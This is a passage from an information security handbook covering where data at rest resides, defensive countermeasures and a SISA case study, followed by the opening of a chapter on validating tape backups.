the “Federal Agency Data Breach Protection Act,” were introduced in 2007 and 
specifically direct agency CIOs not only to enforce data breach policies, but also to 
develop an inventory of all personal computers, laptops, and other hardware that 
contain sensitive personal information.
21.3  Where Does Data at Rest Reside?
The data at rest incidents described in the previous section not only involve diverse 
organizations, but a wide array of technologies as well. Data at rest can be found 
everywhere, including places that are unexpected. As technologies mature, espe-
cially in the arena of solid state storage, data can reside in the smallest of spaces 
unimagined just a decade or so. For example, modern day mobile phones (i.e., 
smart phones) represent some of the most advanced OS and storage technologies 
available. Smart phones run operating systems little different than that of laptops 
or PCs (Windows® Mobile) and have the ability to store information on the phone 
itself as well as interfaces for micro flash drives for additional storage.
Identifying the potential places where data can rest in the enterprise is one of 
the first steps in improving the overall security posture of an organization. With 
the advances in technology in the past ten years, especially in the areas of solid 
state miniaturization, data can now rest in the smallest and most difficult-to-
control places.
The following sections discuss the seven categories of places where data typi-
cally rests in an organization.
21.3.1  Tokens
Tokens are the smallest, lightest, and most portable of storage devices. They are 
exclusively made of solid state technology, which makes them extremely fast and 
can carry enormous amounts of information (tens of Gb) at relatively low cost. The 
smallest of these available commercially is the microSD card, which is the size of 
a fingernail and can fit inside small handheld devices such as cell phones. Other 
examples of token-based storage include the ubiquitous thumb drives, flash cards, 
and smart cards.
Loss of tokens resulting in inappropriate release of sensitive information is far 
too common. USB thumb drives in particular represent so much risk to organiza-
tions that some IT environments disable the use of USB ports on their PCs, even 
resorting to injecting silicone into the ports. The main benefits of using token-based 
storage—high speed, ease of use, lots of space, cheap to buy, and easy to carry—
make them extremely popular. However, these same benefits mean increased risk 
to organizations because they are easy to buy and use, regardless of policy, and also 

Securing Data at Rest  ◾  285
extremely easy to lose. Consequently, securing data at rest in tokens (or prevent-
ing the saving of data in tokens altogether) is becoming an increasingly important 
activity by IT departments.
21.3.2  Smart Handheld Devices
Advances in the miniaturization of technology have allowed handheld devices to 
become extremely powerful in a short period of time in processing power, storage, 
and memory. These devices were once designed, manufactured, and used as single 
purpose devices: phones, pagers, CD players, etc. However, advances in handheld 
hardware manufacturing and, just as importantly, handheld operating systems 
(e.g., Windows Mobile, Blackberry OS) allow them to be more general-purpose 
devices akin to desktops and PCs. Many even run the same applications (Java, 
Office, etc).
The most prevalent of these in enterprise organizations are smart phones such 
as Blackberries that can create documents, send e-mail, surf the Web, view images, 
and take pictures. They all have on-board storage and, even worse, have built-in 
slots to support token storage devices such as SD cards. The standard practice of 
“pushing” or “pulling” content, especially e-mails/attachments, mean that organi-
zations have data at rest in devices far outside of their physical (and oftentimes logi-
cal) span of control. The loss of a smart phone can mean dissemination of extremely 
sensitive data that resides on the handheld, and the security capabilities on these 
devices in general are not as mature as regular notebook-type PCs. However, some 
progress is being made. Some of the newest generation smart phones (Blackberries, 
in particular) allow the administrators to encrypt data as a policy on the mass stor-
age devices that are inserted into the phone.
21.3.3  Endpoints
Data residing on unsecured desktops and laptops has been traditionally the big-
gest source of data loss in the industry. It has deservedly received the most amount 
of attention from the media. Some of the biggest IT security debacles in recent 
memory have been the loss of sensitive information (especially protected health 
information) from desktops and laptops stolen from cars and homes. It is surpris-
ing that these types of losses still occur on a regular basis across both private and 
public sectors.
The most unfortunate part of the continued loss of data at rest via endpoints 
is that technologies, both hardware and software, readily exist for desktops and 
laptops that allow for the protection of saved content. In many organizations, espe-
cially in the public sector, these technologies, which will be discussed later, are 
becoming mandated for the benefit of everyone.

286  ◾  Information Security Management Handbook
21.3.4  Servers
Servers are one of the one most obvious places that data can rest. Access to data 
stored on servers is likely to be the most tightly controlled, and most environments 
do an extremely good job of implementing such control mechanisms as role-based 
access controls and file-level security. Some may even have implemented volume- or 
disk-based encryption that protects the data in the event of theft of the server itself. 
Traditionally, however, protecting data on servers has been focused on authentica-
tion. If a user authenticates appropriately to the available directory services, the user 
has access to files based on some group membership policy. Then these files can be 
used, e-mailed, saved on tokens, posted on portals, etc. What hasn’t seen as much 
adoption is a digital rights policy on the files themselves that marks and protects the 
files after they have been saved or disseminated.
21.3.5  Enterprise Storage
Enterprise storage infrastructures are becoming a more common entity in IT orga-
nizations. They store massive amounts of data, most of which is not in active use. 
Enterprise storage infrastructures are the least likely to have protections for data 
at rest relying exclusively on the physical security policies, network operating sys-
tems, and directory services that interface with the users. The good news is that 
obvious physical loss of an enterprise storage device is generally unlikely, although 
there are military environments that do require protections against physical loss. 
Securing data at rest on enterprise storage environments via encryption is likely to 
be lowest on the priority for organizations due to the obvious physical loss limita-
tions of the infrastructure.
21.3.6  Backup Tapes
Backup tapes and the associated hardware and software components that go with 
them have been an ever-present aspect of IT from the very beginning. They serve 
an obvious and critical role for IT organizations, and until recently have not been 
viewed as a source of risk. However, recent events have shown that tapes can and 
will be lost during transit to off-site locations. This means that a copy of the entire 
IT infrastructure “at rest” can potentially be lost, literally falling off the “back of 
the truck.” Consequently, there has been increasing effort by technology vendors 
to help protect tape-based data at rest, and exciting developments have been made 
recently on the hardware front to secure tapes and the data that resides on them.
21.3.7  Other Media
Similar to backup tapes and tokens, there are numerous other media types that can 
hold data. The most prevalent are CDs and DVDs, which can hold large amounts 

Securing Data at Rest  ◾  287
of data. They are easily transported, generally are not secured with any type of 
security, and due to their low cost are often disposed of without regard for the data 
they contain.
21.4  Protecting Data at Rest
Unfortunately, there isn’t a simple or monolithic answer to protect data at rest. 
There are so many different areas and devices that data can reside on that it requires 
a real earnest and comprehensive effort to identify the various places that data can 
reside and the risks to the data if it is lost or disclosed. Based on the location of 
the data at rest and the element of risk associated with inappropriate disclosure, 
IT security mechanisms can be implemented to protect that data. Although spe-
cific defense approaches in protecting inactive data exist, especially with encryption 
and digital rights management technologies, it is important to note that the initial 
defense mechanisms—physical security and end-user awareness—should already 
exist in most organizations.
21.5  Protective Countermeasures for Data at Rest
The intent of this section is not to present a “how to” on protecting all data at rest. 
Rather the emphasis is on presenting the strategies and technologies available for 
this daunting task. Some will be relatively intuitive and may exist in many orga-
nizations, others require careful evaluation of the appropriateness of the controls 
compared to the relative risk of losing the sensitive content. Although each of the 
discussed elements can play a vital role in an overall enterprise security policy for 
protecting data at rest, there are two strategies that bear mentioning first: (1) physi-
cal security and (2) end-user awareness and compliance.
Physical security: Many of the losses of data in recent memory, arguably almost 
◾
◾
all of the most high-profile ones, involve theft of desktops, laptops, servers, 
or tokens. Good physical security, whether it’s at the office or at home, may 
have prevented these losses. Simple and common sense actions performed by 
everyone in an enterprise, such as locking doors, securing laptops and hand-
helds at all times, and not letting strangers into buildings, should be the very 
first line of defense for protecting the organization from risk.
End-user awareness and compliance: Many of the losses of data at rest are 
◾
◾
caused by lapses in judgment or lack of compliance to established policies 
by end users. Everyone knows someone who “just refuses to comply” with 
the security policies of an organization (not encrypting volumes, improper 
disclosure of passwords, etc). Some of these users end up “losing” the data 
and violating the privacy rights of individuals. Security awareness programs 

288  ◾  Information Security Management Handbook
that are relevant and engaging and policies that emphasize accountability for 
non-compliance should be the norm in organizations.
21.5.1  Technology-Based Countermeasures
Network admission control: Tight controls that guard the entry to the net-
◾
◾
work can help to defend data at rest from intruders and hackers. Too many 
organizations rely on network operating systems and directory services to 
control entry into the network. A more comprehensive network admission 
control mechanism that quarantines all network admission requests (e.g., 
into separate VLANs for posture check and correct) until properly authenti-
cated and verified will help defend the data on the network.
Standardization: The standardization of vendors and models of the IT infra-
◾
◾
structure where data at rest resides can have enormous impact on the abil-
ity of IT departments to implement and manage countermeasures against 
potential threats. For example, there are vast differences between the offline 
vulnerabilities between Windows XP and Windows Vista (via BitLocker and 
TPM support). Standardizing on one will allow a single approach either to 
use a feature within an operating system (like BitLocker) or the implementa-
tion of a third-party encryption product like PointSec.
Virtualization: Virtualization is one of the most important trends occurring 
◾
◾
in the industry today. The ability to virtualize the entire IT infrastructure, 
including servers, switches, and desktops, offers enormous advantages in the 
securing of data at rest, because the data stores where the data will reside will 
likely be on a centralized storage infrastructure such as a SAN.
Compartmentalization: The compartmentalization of data into functional 
◾
◾
areas within an organization can help to protect data at rest by preventing 
access by unauthorized users. The creation of virtual enclaves by user iden-
tity and role plays an important role in protecting data that should not be 
accessible based on functional role. For example, a user in a finance depart-
ment can be isolated into a virtual compartment by being assigned a virtual 
desktop (with such technologies as VMware® Virtual Desktop infrastruc-
ture), virtual LAN (an 802.1q VLAN), virtual SAN compartment (with only 
data that the finance department should have access to), and virtual servers. 
Compartmentalization via a virtual path can be an effective and useful tool 
for protecting data at rest.
21.5.2  Encryption: The Line in the Sand
Ultimately, when all of the previously discussed countermeasures for protecting 
data at rest fail, the last line of defense is encryption. There are far too many encryp-
tion products and solutions to do a comprehensive review of each in this chapter. 
Rather, it is more important to be able to classify them and identify some of the 

Securing Data at Rest  ◾  289
benefits of each in protecting data at rest. Also, these classes of encryption solutions 
can be layered into a defense-in-depth approach, which will be described later, 
along with the protective measures described earlier to maximize the protection 
scheme around an organization’s data at rest.
The following list categorizes typical encryption technologies available in 
the market:
Operating system based encryption: OS-based volume-level encryption is 
◾
◾
the most readily available, easy to deploy, cost-effective solution available 
to IT organizations on desktops, laptops, and servers (e.g., Windows EFS, 
BitLocker, Solaris Volume Manager). However, most smart handheld opera-
tion systems do not have native volume encryption capability; therefore, other 
approaches should be considered in encrypting data at rest on handhelds. In 
addition, OS-based volume-level encryption generally does not protect data 
being transferred to ports such as USB and media devices such as DVDs.
Third-party software based encryption: Due to the limitation of OS-based 
◾
◾
encryption features, there is a large market for protecting data at rest beyond 
the capabilities of typical operating systems. Technologies, such as Check 
Point Software’s media protection, add encryption capabilities at a port level 
protecting media that are connected via ports (USB, DVD/CD). There are 
numerous software-based encryption based capabilities that also help protect 
data residing on smart handhelds. Open source software solutions, such as 
TrueCrypt, that use FIPS-compliant algorithms, are available to virtually 
everyone, making software-based encryption an option for even the smallest 
of organizations.
Hardware-based encryption: The main disadvantage of using any type of 
◾
◾
software-based encryption (including OS based) is that it takes a performance 
toll on the operating system and hardware platform that the encryption soft-
ware is residing on. Consequently, enterprise technology vendors have devel-
oped hardware-based solutions designed to encrypt data at the hardware level 
as the data traverses the storage infrastructure. For example, Cisco System’s 
storage media encryption (SME) technology encrypts all data as it is saved 
both on the storage infrastructure and backup tapes with no impact on the 
server and backup performance. Additional features such as hardware-based 
key management, which is essential for large organizations, can be performed 
at the hardware, reducing complexity and cost to the administrators.
Digital rights management: The most granular, controllable, and controver-
◾
◾
sial encryption technology available for organizations is DRM. Each indi-
vidual file or instance of content (both at rest and in flight) can be protected 
by encryption technology integrated with auditing, logging, and enterprise 
directories. Aside from the typical arguments regarding the application of 
DRM creative media (music, video, etc.), DRM can be an extremely powerful 
tool that can be used to share information with confidence as the protective 

290  ◾  Information Security Management Handbook
schemes available from DRM providers allow data at rest to be persistent 
across organizations. DRM can also be applied on top of all of the other pro-
tection technologies for data at rest described previously, and the application 
of these technologies creates a fortress of concentric defenses around the con-
tent at rest, effectively separating data loss/theft with disclosure of content.
21.6  Defense in Depth: Lessons from Stalingrad
In the largest military battle in human history, the battle of Stalingrad in World 
War II, the German and Russian armies with soldiers counting in the millions used 
the strategy of defense in depth to counter offensives from the opposing armies to 
great effect. Both armies arranged their defenses in layers to reduce the momentum 
of the opposing armies at each layer. This approach of layering defenses has its roots 
in the battles of antiquity, and the strategy and the term has been borrowed to 
describe a similar tactic in information security. The layers of countermeasures that 
can be implemented to protect data at rest make it that much more difficult for an 
incident to occur. However, each layer adds to the overall cost of ownership of the 
information, and having a planned approach based on the balance of the sensitivity 
of the information and the costs associated with its defense is a vital element in an 
overall strategy toward defending data at rest.
Figure 21.1 presents a conceptual view of the countermeasures that have been 
described and a potential defense-in-depth strategy that can be created with them. 
The following list describes actual in-depth strategies that can be implemented to 
protect the various places that data can rest. Although not explicitly listed, end-
user awareness and physical security should always be included as the first layer 
of defense.
Location of data at rest: Potential defense-in-depth layers
◾
◾
Tokens: Standardization, DRM
◾
◾
Smart phones: Standardization, DRM, third-party software encryption
◾
◾
Endpoint: Standardization, virtualization, compartmentalization, DRM
◾
◾
Servers: Standardization, virtualization, compartmentalization, OS-level 
◾
◾
encryption, third-party software encryption
Enterprise storage: Virtualization, compartmentalization, hardware-
◾
◾
based encryption
Backup tapes: Hardware-based encryption
◾
◾
Other media: Standardization, DRM, third-party software encryption
◾
◾
The previous sections of this chapter discussed the nature of data at rest and the 
countermeasures that are available to protect it in general and conceptual terms. 
However, no analysis of a topic is complete without a discussion of the application 
of concept to technologies. To that end, this chapter will provide a Case Study of 

Securing Data at Rest  ◾  291
the Secure Information Sharing Architecture (SISA) and its approach toward pro-
tecting data at rest.
21.7  Case Study: Secure Information 
Sharing Architecture
21.7.1  What Is SISA?
The Secure Information Sharing Architecture (SISA) was publicly launched in July 
2007, and is a secure, role-based, collaboration framework architected to support 
the sharing of sensitive information within and between communities of trust in 
a single security or classification level. SISA was born from an end-user require-
ment that was largely focused on the protection of information, both at rest and 
in transit. This end-user entity produced and distributed sensitive and often highly 
classified information in a tactical, multinational environment where the security 
and integrity of information was paramount.
Content at Rest
Hardware & Software
Encryption
Standardization,
Virtualization,
Compartmentalization
Physical Security & End
User Awareness
Figure 21.1  Conceptual view of countermeasures and a potential defense-in-
depth strategy.

292  ◾  Information Security Management Handbook
SISA is also an industry alliance that was formed to meet the information 
security requirements of the aforementioned end-user entity. The “customer” 
was heavily invested in technologies from the founding alliance partners, Cisco 
Systems, EMC Corporation, and Microsoft Corporation, and approached these 
three technology vendors to architect cooperatively an information-sharing 
solution with commercial off-the-shelf (COTS) products that were generally 
available from each of the three companies. Additionally, three specialty tech-
nology partners were brought into the alliance to cover the baseline require-
ments of the reference architecture: Liquid Machines, Titus Labs, and Swan 
Island Networks.*
21.7.2  SISA History
As mentioned earlier, SISA was brought forth by an end-user entity requiring rapid 
deployment of resources to accommodate a multinational information-sharing 
environment where sensitive information needed to be distributed. The need to 
share information was the primary driver for the initiative. The quickest foresee-
able path to implementation was via COTS products, but the question remained 
whether or not COTS products and solutions were mature enough to allow con-
trolled information sharing in a multinational environment.
In its original implementation, SISA was designed around some key concepts 
surrounding data-at-rest security and the protection of information in flight 
to address the challenges faced by end-user entities as they adapt to meet the 
requirements of rapid and secure information sharing. The pre-SISA environ-
ment consisted of a network that resembled the notional topology shown in 
Figure 21.2.
In a typical network deployment for the end users (Figure 21.3), we see several 
server processes and applications running in the back office, with nearly an equal 
number of dedicated personnel with skill sets tailored to specific servers or applica-
tions. However, the environment consisted of 11 of these networks within the same 
security level.
With this in mind, and taking into consideration the unique elements involved 
in a multinational environment, the complexity level of managing such an envi-
ronment and maintaining the security of information was a daunting challenge. 
For instance, the organization maintained 11 different networks, each with unique 
configurations. Eleven different authentication sources were employed and, in 
*	More information about the SISA partners can be found at the following URLs: http://www.
cisco.com (Cisco Systems, Inc.), http://www.emc.com (EMC Corporation), http://www.
microsoft.com (Microsoft Corporation), http://www.liquidmachines.com (Liquid Machines 
Corporation), http://www.titus-labs.com (Titus Labs), and http://www.swanisland.net (Swan 
Island Networks).

Securing Data at Rest  ◾  293
many cases, end users had 11 sets of usernames and passwords just to gain access to 
network resources, applications, services, and storage.
In addition to cost concerns and the complexity of management, added secu-
rity risks were involved when attempting to share information. Data needed to 
be created and duplicated many times over to share that information and place it 
on the various networks, depending on community-of-trust relationships. Having 
multiple copies of sensitive information residing on multiple networks introduced 
risk to the integrity of that information. This in and of itself made real-time col-
laboration and rapid distribution of sensitive materials very cumbersome tasks at 
best, and hardly immediate.
21.7.3  SISA Architecture
When SISA was being architected for this end-user entity, several key concepts were 
developed to provide a framework for successfully solving the identified problems:
Sensitive and internal information had to be encrypted and protected upon 
◾
◾
creation and while remaining at rest or in flight.
The protection of sensitive information would facilitate the ability to consoli-
◾
◾
date infrastructure to reduce the complexity of the topology greatly, which by 
its nature promotes rapid access to information that needs to be shared.
Leveraging security mechanisms and ensuring the integrity of data at rest, 
◾
◾
coupled with the consolidation of infrastructure, allows interorganization 
information sharing and the ability to collaborate across trust boundaries.
Switch
Users
PC
Maint
Network
Admin
Cable
Mgt
Physical Server
Server
Maint
Systems
Maint
Database
Maint
Distinct Network
Storage Area Network
Tape Backup System
Infrastructure
HVAC, Power, Racks, etc
Distinct and Shared Training
Multiple servers
Dual wiring for each server
Large data storage system
Tapes
Core
Services
DHCP
Mobilize
NAV
DF
Web
App
Storage
Monitor
DC
DNS
WINS
Email
Print
Backup
Switches
Wiring
Oﬀ-site storage
Help
Desk
Web
Maint
Customer
Service
Info
Assurance
Storage
Admin
Switch
Switch
Figure 21.2  Typical network and back office, single location.

294  ◾  Information Security Management Handbook
TS
Switch
TS
TS
Switch
Switch
Switch
Switch
Switch
TS
Switch
Switch
Switch
DHCP
Monitor
NAV
DF
Web
App
DC
DNS
WINS
Email
Print
Storage
Backup
SAN
Tape
AU
Monitor
NAV
DF
Web
App
DC
DNS
WINS
Email
Print
Storage
Backup
SAN
Tape
AU
Monitor
NAV
DF
Web
App
DC
DNS
WINS
Email
Print
Storage
Backup
SAN
Tape
AU
DHCP
DHCP
Moblll 20
Moblll 20
Moblll 20
Figure 21.3  Network and back office replication.

Securing Data at Rest  ◾  295
In mapping these key concepts to technical requirements, Figure 21.4 shows the 
major technical concepts surrounding the implementation:
Role-based authentication and authorization: End users are mapped to roles, 
◾
◾
and these roles determine their level of access to resources and information 
in the environment.
Virtual compartments: A consolidated physical infrastructure is compart-
◾
◾
mentalized so that end users can operate entirely within their own commu-
nity of trust. This is also known as path isolation.
Defense in depth: Where possible, multiple measures are employed to ensure 
◾
◾
that the environment cannot be breached from the outside and that commu-
nities of trust remain isolated to preserve the integrity of information.
21.7.4  Technologies for Defense in Depth
Pursuing more detail, we further break SISA down into its security services, as 
shown in Figure 21.5, where five key elements are identified to represent security 
best practices within SISA for data at rest and in flight.
21.7.4.1  Endpoint Protection
In SISA, endpoint protection is focused primarily on protecting computers from 
viruses, malware, worms, spyware, the installation and launching of root kits, and 
day-zero attacks. It is recommended that antivirus, antispyware, updated operating 
Role-Based
Authentication/Authorization
Virtual Compartments/
Path Isolation
Core/Communities of Trust
Authenticate, Authorize,
Assess Posture
Authenticate client (user,
device, app) attempting to gain
network access.
IP KG
Functions
Map isolated paths to VLANs in
access and services edge.
Maintain community of trust
relationships.
Enable growth for layer-3 path
isolation.
Inspect endpoints for proper
security posture.
Authorized client into a partition
(VLAN, ACL).
VLANs
ACLs
VRFs
Figure 21.4  SISA conceptual architecture goals.

296  ◾  Information Security Management Handbook
system patches, and other related endpoint software applications be applied and 
maintained (up to date) to prevent these types of attacks.
Endpoint protection is also tightly coupled with the preservation of the integ-
rity of information on endpoints, where localized encryption is employed to protect 
sensitive information, should the actual endpoint be stolen or lost. To protect end-
points in such cases, encrypting the local file system can provide a necessary layer 
of security that leverages the role-based authentication and authorization practices 
that form the foundation of the SISA architecture to provide security of the local 
file system, transparent to the end user who applied the encryption, but linked to 
that individual and his or her role.
Additionally, the use of an endpoint security agent is prevalent in SISA to moni-
tor for abnormal or unauthorized behavior on workstations and laptops. Endpoint 
security agents can deny such actions as copying sensitive information from one 
program or application to another, writing information from the endpoint to remov-
able media such as a USB flash drive or writable CD, and attaching to shared net-
work drives to transfer sensitive information off of the endpoint. Endpoint security 
agents operate between the kernel and operating system, thus monitoring operating 
system calls and enabling maximum application visibility with minimal impact to 
the stability and performance of the operating system. The agent applies rules-based 
intelligence to correlate these operating system calls and determines whether those 
actions are unacceptable or inappropriate, before blocking the requested actions 
and reporting the incident to the back office.
Endpoint protection also relies on access protection and content protection, 
as many elements of the SISA security services have dependencies on each other, 
which promotes defense in depth.
Endpoint Protection
Manages and controls authenticated
devices, validating adherence to policy
Access Protection
Manages and controls authenticated
and networked resources
Adaptive Threat Defense
Intelligent auditing and intrusion
Data Protection
Provides management, encryption,
scalability, and separation to protect
continuity, stored data from external
and internal threats
Content Protection
Collaboration services with persistent
protection against inadvertent or
malicious disclosure of ﬁles,
documents and e-mails
Collaboration
Email
Instant Messaging
Portal (Search, Content Management)
Notiﬁcation
Security
Endpoint Protection
Access Protection
Content Protection
Data Protection
Adaptive Threat Defense
Management
Virtualization Platform Management
Server Management
Virtualization
Server Visualization
Network Virtualization
Storage Network Virtualization
Figure 21.5  SISA security services.

Securing Data at Rest  ◾  297
21.7.4.2  Access Protection
In most cases, the first touch point to access resources is the physical network infra-
structure, whether by on-site or remote methods. The primary access protection 
mechanism of SISA is network admission control coupled with authentication 
and authorization with the back-office infrastructure. Network admission control 
monitors access to the network at the port level, where network admission control 
appliances can monitor switch ports for authorized endpoints and allow or deny 
connectivity. At the same time, network admission control appliances can share 
end-user credentials with the back-office directory services (domain authorization), 
which provides the end user with a unified front for admission to the network. 
While credentials are being verified, endpoints are assessed for their security pos-
ture. For example, rules can be created to search specifically for the presence of 
certain operating system releases and patch level, the presence of antivirus software, 
up-to-date definitions, and the presence of an endpoint security agent, the agent’s 
status, and its security level settings. SISA best practices recommend that these pos-
ture checks occur in a quarantined environment where access to the authorized net-
work segments can only be granted once the end user is authenticated, authorized, 
and the endpoint validated for the proper security posture and deemed “clean.”
Access protection is also the mechanism by which SISA establishes network 
path isolation. Once the end user’s authentication and authorization have been 
established, as well as that of the physical endpoint, the user is granted access to 
authorized network segments. Once this is established, the end user is now in the 
community of trust, which extends all the way to the back-office applications and 
storage environment.
21.7.4.3  Content Protection
The primary goal of content protection is to prevent inadvertent or deliberate dis-
closure of sensitive information. Enterprise rights management plays a lead role 
in SISA for content protection by providing document marking and encryption 
directly linked to role-based authentication and authorization. In other words, con-
tent is encrypted and a role-based access policy is applied upon creation, leveraging 
the definition of end-user roles to allow or deny access to information based on 
community-of-trust participation.
Enterprise rights management also allows one to employ fine-grained controls 
such as:
Allowing or preventing the removal or changing of security policies
◾
◾
Controlling read, write, and print privileges
◾
◾
Allowing or preventing copy/paste actions with respect to content
◾
◾
Granular specification of individual access to secure documents
◾
◾
The ability to expire a document and its access keys after a specified time
◾
◾

298  ◾  Information Security Management Handbook
21.7.4.4  Data Protection
Data protection in SISA is focused on data at rest in the storage environment. 
The obvious mechanism for this is data-at-rest encryption, which is a foundation 
technology still pervasive throughout SISA. Additionally, in a consolidated multi-
ple-communities-of-trust environment, complexities arise, where advanced tech-
nologies such as device masking and zoning are employed to assign and mask access 
privileges to specific physical interfaces. The creation and management of virtual 
storage networking environments allows storage, in essence, to be partitioned into 
secure segments aligned to a specific community of trust.
Furthermore, access control is used to protect data further by leveraging role-
based authentication and authorization within the isolated network path. For 
instance, device-level access controls are implemented to restrict access to hosts. 
Service-level access control is employed to authorize, authenticate, and audit service 
actions to prevent unauthorized actions.
21.7.4.5  Adaptive Threat Defense
Adaptive threat defense in SISA is primarily targeted at augmenting security infor-
mation and event management by providing a means to apply a rules-based engine 
to aggregate critical events within a community of trust and provide correlation to 
isolate the source of intrusions and malicious activity. Applying this correlation capa-
bility allows for the identification of threats in the environment and provides notifica-
tion of its impact on the network. The information can be used to monitor and assess 
actively the effectiveness of the security policy deployed in a particular environment.
21.7.5  Case Study Summary
Immediate benefits were realized once the end-user entity deployed SISA:
Eleven networks were collapsed into one.
◾
◾
Information is created and stored once.
◾
◾
Security policy and encryption is applied once to documents/content.
◾
◾
A single authentication source was used for the entire environment, which 
◾
◾
also leveraged single sign-on to keep the end-user experience as streamlined 
as possible.
“Like-classification” data now traveled on a single wire, but community-of-
◾
◾
trust information remained isolated, providing true network path isolation 
from the endpoint to the back office.
SISA’s initial case study is one single example that speaks to the benefits of 
the architecture, but the key message from the initial exercise exposes technologies 
and best practices that pose significantly streamlined examples for realizing rapid 

Securing Data at Rest  ◾  299
and secure information sharing, while reducing the complexity of management and 
associated risks in many industry segments. As the SISA program evolves with the 
current and future security standards and policy management methods, new and 
unique use cases will further drive development within the program to present a 
truly adaptable architecture that is evolutionary in nature, with security at its core.
21.10  Conclusion
Data at rest is one of the most challenging issues facing the IT industry today. The 
volume and the rate at which data is accumulating has challenged the industry to 
secure the data not in active use (data at rest), which constitutes the vast majority of 
electronic data in the world today. The chapter discussed the nature of data at rest, 
where it can reside, and the solutions and strategies that the industry is developing 
across many fronts to secure it. The chapter concluded with a detailed case study of 
one alliance-based approach called SISA. No matter what the approach or technol-
ogy the readers choose to implement for defending their data, the authors of this 
chapter hope that the readers have benefited with an increased awareness of the 
need to protect data at rest.


7
OPERATIONS 
SECURITY


303
22
Chapter 
Validating Tape Backups
Sandy Bacik
The enterprise has planned an update to the payroll system. No problem. IT per-
forms daily incremental backups and weekly full backups. IT rotates the tapes off 
site on a weekly basis and keeps the quarter-end backups for two years. IT tested 
the payroll system upgrade in a test environment and there were no problems. IT 
performs the payroll system upgrade in the production environment and—uh, 
oh—the production environment was not configured the same as the test environ-
ment. No problem; IT will just restore the payroll system and database from last 
week’s backup tapes. IT recalls the tapes and starts to perform the restore, and 
the tape containing the payroll system has become corrupt. IT recalls the previ-
ous backup and starts the restore. IT realizes during the restore that the payroll 
system backup had not been successful and now IT frantically searches through 
the backup tape library for a valid payroll system back up. The last GOOD pay-
roll system backup is more than three months old. Wow, how many new hires, 
terminations, and promotions have happened in the last three months? How does 
the enterprise (and IT) recover? Do they contact the payroll software supplier and 
try to continue to move forward? What was the drop-dead time for the payroll 
system upgrade?
Has this ever happened to your enterprise? If not, well done for the enterprise 
backup and recovery processes being documented and tested on a regular basis. If 
so, then the enterprise may want to enhance existing processes to prevent this type 
of incident in the future.
What the heck are LTO, 8mm, DLT, SDLT, and SLR? These are just a few tape 
types that enterprises use to back up systems. Yes, some enterprises have gone to 
removable disk and disk-to-disk backups. Yet, many more enterprises continue to 
use tape backup systems.

304  ◾  Information Security Management Handbook
Every enterprise understands that system and data backups are a daily 
requirement of business. Many of those enterprises that have implemented tape 
backup systems do not implement best practices for their physical and logical 
tape backup processes. A backup process copies important enterprise infor-
mation onto magnetic tape or other devices. Backups enable the enterprise to 
restore anything from a single file to a complete system. Backups and restores 
have helped enterprises recover from data losses caused by outages, disasters, 
power surges, user errors, equipment failures, and viruses. Data recovery pro-
cesses, tools, and services exist, but they can be limited and can be expensive. 
Recovery of all lost information through a system restore may be unlikely and 
users may have to recreate some of the data again. Enterprises need to con-
tinue the downtime during the recovery, which may also be costly. A well-
designed backup system safeguards critical information by providing the most 
efficient and cost-effective methodology as insurance against a potentially large 
data loss. An information backup and recovery standard should consist of four 
major components:
	
1.	Enterprise critical information should be backed up.
	
2.	Information backups should be stored at a physically different location from 
its original creation and usage location.
	
3.	Backup test processes should be performed regularly.
	
4.	The enterprise’s ability to retrieve and restore backup data should be tested 
and produce successful results on a regular basis.
When evaluating tape backup systems, has the enterprise looked at the physical 
placement of the device? Have the requirements been defined for:
Size of the data center racks
◾
◾
Dimension of the tape device
◾
◾
Power requirements (primary and redundant) of the tape device
◾
◾
Air flow considerations of the tape device
◾
◾
The enterprise knows that the device will go into the server room or data center. 
Wait; when were the environmental elements of the location or the devices and phys-
ical space reviewed for expansion. When a tape backup system is implemented or 
upgraded, the environmental and physical status needs to be evaluated. In addition to 
the listed requirements, the enterprise must also define the following requirements:
Power on password: For cold and warm boots, this would prevent the use 
◾
◾
of the server/device until a password is entered. This prevents unauthorized 
access to the device setup utility and operating system. Although this is a 
good practice, the enterprise must also remember that a staff member must 
then be at the console whenever the server/device boots.

Validating Tape Backups  ◾  305
Administrator password: This would prevent local or remote access to a 
◾
◾
server/device after a possible automatic recovery, and also prevents unauthor-
ized changes to the server’s/device’s system configuration information.
CD-ROM/diskette drive/boot control: This would disable the ability to read 
◾
◾
or boot from a different device that might bypass the operating system and 
leave system files vulnerable to changes or deletion.
Serial/parallel interface control: This would disable anyone walking up to the 
◾
◾
device and using the serial or parallel ports for unauthorized access.
These are some of the basic security requirements; how does an enterprise 
determine the backup needs for the enterprise? Developing a successful backup 
strategy begins with planning a needs analysis for backups or reviewing what is 
being backed up currently. The backup administrator needs to look at the enterprise 
backup needs and match those to the tape backup hardware and software. The 
backup administrator needs to start with the following types of questions:
What information (systems, programs and data) must be backed up and 
◾
◾
recoverable?
How much information does this entail? Gigabytes? Terabytes?
◾
◾
What format will the tapes and tape headers use? Does all the information 
◾
◾
being backed up qualify for ANSI backups?
How much additional capacity is needed because of backup redundancies 
◾
◾
resulting from special, user-defined backups?
How much time is going to be needed to perform each set of information 
◾
◾
backups?
Are any pieces of software customized or can the enterprise use CD-ROM 
◾
◾
media for software (not data) recovery?
For determining storage capacity and budget planning, how much will the 
◾
◾
information grow over the next three to five years?
What is the backup scheduling and archiving? Daily differentials, or incre-
◾
◾
mentals and a weekly full backup? Grandfather, father, son tape rotations?
What does the enterprise want to do about remote locations?
◾
◾
Does the enterprise also want the desktops and laptops backed up?
◾
◾
Can the backups run unattended to reduce administrative costs? If so, how 
◾
◾
will the tapes be taken off site?
What is the rotation and capacity of the off-site tape storage facility?
◾
◾
What is the tape return time from the off-site tape storage facility?
◾
◾
The enterprise has implemented a tape backup system, selected an off-site tape 
storage supplier, ordered the backup and replacement tapes, and is ready to start 
developing the formal processes for information backup and recovery. The follow-
ing are the topics that should be required for documenting the information backup 
and recovery:

306  ◾  Information Security Management Handbook
Who is responsible for the information backups and restores?
◾
◾
Who has the authority to request an information backup or restore?
◾
◾
What is the step-by-step process for the information backup and restore?
◾
◾
Per regulatory requirements, does the enterprise have to encrypt all or some 
◾
◾
of the backed up information on the tape?
Will the data on tapes be compressed to store more information per tape?
◾
◾
Is the server environment virtualized? If so, will the underlying operating 
◾
◾
system or applications be backed up as well?
What is the tape retention standard for the information backed up and who 
◾
◾
owns the information that is backed up?
What happens when an information backup or restore fails or is successful?
◾
◾
How are the information backups and restores monitored and tracked?
◾
◾
Which databases are backed up? Production? Test? Development? Human 
◾
◾
Resources? Manufacturing? Finance?
Are database backups handled differently from regular file backups? For 
◾
◾
example, databases can be backed up to a flat file and the flat file can be 
